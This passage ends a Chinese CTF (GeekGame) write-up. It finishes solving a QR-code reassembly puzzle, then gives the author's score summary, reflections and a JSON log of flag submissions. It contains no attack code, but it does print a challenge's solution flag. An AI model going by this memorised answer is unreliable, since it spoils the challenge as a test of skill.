然后交给命运，不停交换认为错误的块（在 puzzle merak 里交换，游戏里交换一下会累死人的），放到画图里补全左上角，保存，上传给 qrazybox 分析一下，看看数据对不对，然后返回本段话开头继续操作

在十几次艰难的尝试后，直接得到二维码数据 `flag{Lol Amazing I Like Puzzle}`，草了，原来这题不需要完成游戏啊

#### ~~华维码·特小~~

试着拼了一下，正中间的定位点缺失，笑死，无法确定的也太多了，扔了（

## 后记

### 比赛记录

`UID: #13`

总分 $3613 = \text{Tutorial } 195 + \text{Misc } 1045 + \text{Web } 952 + \text{Binary } 556 + \text{Algorithm } 865$，二阶段获取 $721$ 分，校内排名第 11，总排名第 17，总一血有一道多一点，分别是签到题“一眼盯帧”和“小章鱼的曲奇”的第一问，可惜了，“小章鱼的曲奇”按理说可以拿个先锋奖的，因为第二、三问全可以非预期，我要是稍微看一眼试一下就弄出来了（

惨的不行，感觉好几题都不该在二阶段做出的，一阶段貌似冲到过校内第七，当然因为签到一血所以肯定上过总第一啦，不过 Misc 除 MC 的第三问以外和 Web 全部通杀还是挺高兴的，就是不会 Binary（

第一次参加 Geekgame，纯属是因为身份变成校内了有奖可拿，因为打了这个所以今年 Hackergame 就基本鸽了，Bilibili sec1024 看看有没有钱赚再说

最后附上个人提交历史记录用以纪念：

```json
[
  {
    "idx": 0,
    "challenge_title": "非法所得",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "Flag 3",
    "gained_score": 63,
    "timestamp_s": 1697786330
  },
  {
    "idx": 1,
    "challenge_title": "Baby Stack",
    "category": "Binary",
    "category_color": "#864a2d",
    "matched_flag": "Flag 1",
    "gained_score": 58,
    "timestamp_s": 1697738525
  },
  {
    "idx": 2,
    "challenge_title": "非法所得",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "Flag 2",
    "gained_score": 62,
    "timestamp_s": 1697726571
  },
  {
    "idx": 3,
    "challenge_title": "非法所得",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "Flag 1",
    "gained_score": 60,
    "timestamp_s": 1697703201
  },
  {
    "idx": 4,
    "challenge_title": "简单的打字稿",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "Very Easy",
    "gained_score": 60,
    "timestamp_s": 1697648619
  },
  {
    "idx": 5,
    "challenge_title": "简单的打字稿",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "Super Easy",
    "gained_score": 82,
    "timestamp_s": 1697638629
  },
  {
    "idx": 6,
    "challenge_title": "第三新XSS",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "记忆",
    "gained_score": 100,
    "timestamp_s": 1697635592
  },
  {
    "idx": 7,
    "challenge_title": "第三新XSS",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "巡猎",
    "gained_score": 54,
    "timestamp_s": 1697632665
  },
  {
    "idx": 8,
    "challenge_title": "猫咪状态监视器",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "",
    "gained_score": 62,
    "timestamp_s": 1697629174
  },
  {
    "idx": 9,
    "challenge_title": "逝界计划",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "",
    "gained_score": 120,
    "timestamp_s": 1697626401
  },
  {
    "idx": 10,
    "challenge_title": "关键词过滤喵，谢谢喵",
    "category": "Algorithm",
    "category_color": "#2f2d86",
    "matched_flag": "字数统计喵",
    "gained_score": 91,
    "timestamp_s": 1697568578
  },
  {
    "idx": 11,
    "challenge_title": "未来磁盘",
    "category": "Algorithm",
    "category_color": "#2f2d86",
    "matched_flag": "Flag 1",
    "gained_score": 132,
    "timestamp_s": 1697545825
  },
  {
    "idx": 12,
    "challenge_title": "华维码",
    "category": "Algorithm",
    "category_color": "#2f2d86",
    "matched_flag": "华维码 · 特难",
    "gained_score": 170,
    "timestamp_s": 1697539666
  },
  {
    "idx": 13,
    "challenge_title": "绝妙的多项式",
    "category": "Binary",
    "category_color": "#864a2d",
    "matched_flag": "Baby",
    "gained_score": 198,
    "timestamp_s": 1697509868
  },
  {
    "idx": 14,
    "challenge_title": "Emoji Wordle",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "Level 3",
    "gained_score": 166,
    "timestamp_s": 1697467200
  },
  {
    "idx": 15,
    "challenge_title": "Emoji Wordle",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "Level 1",
    "gained_score": 84,
    "timestamp_s": 1697464533
  },
  {
    "idx": 16,
    "challenge_title": "Emoji Wordle",
    "category": "Web",
    "category_color": "#2d8664",
    "matched_flag": "Level 2",
    "gained_score": 101,
    "timestamp_s": 1697463730
  },
  {
    "idx": 17,
    "challenge_title": "Z 公司的服务器",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "流量包",
    "gained_score": 166,
    "timestamp_s": 1697458692
  },
  {
    "idx": 18,
    "challenge_title": "Z 公司的服务器",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "服务器",
    "gained_score": 95,
    "timestamp_s": 1697451905
  },
  {
    "idx": 19,
    "challenge_title": "初学 C 语言",
    "category": "Binary",
    "category_color": "#864a2d",
    "matched_flag": "Flag 1",
    "gained_score": 92,
    "timestamp_s": 1697444315
  },
  {
    "idx": 20,
    "challenge_title": "小章鱼的曲奇",
    "category": "Algorithm",
    "category_color": "#2f2d86",
    "matched_flag": "SUPA BIG Cookie",
    "gained_score": 206,
    "timestamp_s": 1697440804
  },
  {
    "idx": 21,
    "challenge_title": "小章鱼的曲奇",
    "category": "Algorithm",
    "category_color": "#2f2d86",
    "matched_flag": "Big Cookie",
    "gained_score": 173,
    "timestamp_s": 1697428318
  },
  {
    "idx": 22,
    "challenge_title": "Dark Room",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "Flag 2",
    "gained_score": 225,
    "timestamp_s": 1697392529
  },
  {
    "idx": 23,
    "challenge_title": "Dark Room",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "Flag 1",
    "gained_score": 97,
    "timestamp_s": 1697386943
  },
  {
    "idx": 24,
    "challenge_title": "汉化绿色版免费下载",
    "category": "Binary",
    "category_color": "#864a2d",
    "matched_flag": "高速下载",
    "gained_score": 129,
    "timestamp_s": 1697374631
  },
  {
    "idx": 25,
    "challenge_title": "麦恩·库拉夫特",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "结束了？",
    "gained_score": 123,
    "timestamp_s": 1697286686
  },
  {
    "idx": 26,
    "challenge_title": "麦恩·库拉夫特",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "探索的时光",
    "gained_score": 61,
    "timestamp_s": 1697285941
  },
  {
    "idx": 27,
    "challenge_title": "小北问答!!!!!",
    "category": "Tutorial",
    "category_color": "#333333",
    "matched_flag": "整份 Flag",
    "gained_score": 88,
    "timestamp_s": 1697277454
  },
  {
    "idx": 28,
    "challenge_title": "基本功",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "冷酷的 Flag",
    "gained_score": 134,
    "timestamp_s": 1697276420
  },
  {
    "idx": 29,
    "challenge_title": "基本功",
    "category": "Misc",
    "category_color": "#7e2d86",
    "matched_flag": "简单的 Flag",
    "gained_score": 82,
    "timestamp_s": 1697270544
  },
  {
    "idx": 30,
    "challenge_title": "小章鱼的曲奇",
    "category": "Algorithm",
    "category_color": "#2f2d86",
    "matched_flag": "Smol Cookie",
    "gained_score": 93,
    "timestamp_s": 1697264212
  },
  {
    "idx": 31,
    "challenge_title": "汉化绿色版免费下载",
    "category": "Binary",
    "category_color": "#864a2d",
    "matched_flag": "普通下载",
    "gained_score": 79,
    "timestamp_s": 1697220225
  },
  {
    "idx": 32,
    "challenge_title": "小北问答!!!!!",
    "category": "Tutorial",
    "category_color": "#333333",
    "matched_flag": "半份 Flag",
    "gained_score": 67,
    "timestamp_s": 1697212301
  },
  {
    "idx": 33,
    "challenge_title": "一眼盯帧",
    "category": "Tutorial",
    "category_color": "#333333",
    "matched_flag": "",
    "gained_score": 40,
    "timestamp_s": 1697191297
  }
]
```
